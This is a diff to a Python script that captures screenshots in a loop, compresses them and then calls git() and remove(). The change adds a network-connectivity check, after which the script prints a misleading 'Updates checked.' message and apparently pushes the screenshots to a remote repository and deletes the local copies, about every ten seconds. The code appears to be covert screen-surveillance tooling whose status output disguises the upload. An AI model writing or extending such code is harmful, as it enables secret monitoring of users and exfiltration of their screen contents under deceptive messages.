@@ -5,6 +5,7 @@ import subprocess as cmd
 import shutil
 import os
 from PIL import Image
+import socket
 
 
 def git():
@@ -35,6 +36,21 @@ def compressMe(fp):
     return
 
 
+def is_connected():
+  try:
+    # see if we can resolve the host name -- tells us if there is
+    # a DNS listening
+    REMOTE_SERVER = "one.one.one.one"
+    host = socket.gethostbyname(REMOTE_SERVER)
+    # connect to the host -- tells us if the host is actually
+    # reachable
+    s = socket.create_connection((host, 80), 2)
+    s.close()
+    return True
+  except:
+     pass
+  return False
+
 if __name__ == '__main__':
     count = 0
 
@@ -45,9 +61,11 @@ if __name__ == '__main__':
         g.screenshot(source)
         time.sleep(1)
         compressMe(source)
-        git()
+        if is_connected() == True:
+            print("Updates checked.")
+            git()
+            remove()
+        else:
+            pass
         time.sleep(0.5)
-        remove()
-        count += 1
-        print(f"Iteration no. {count}")
-        time.sleep(30)
+        time.sleep(10)
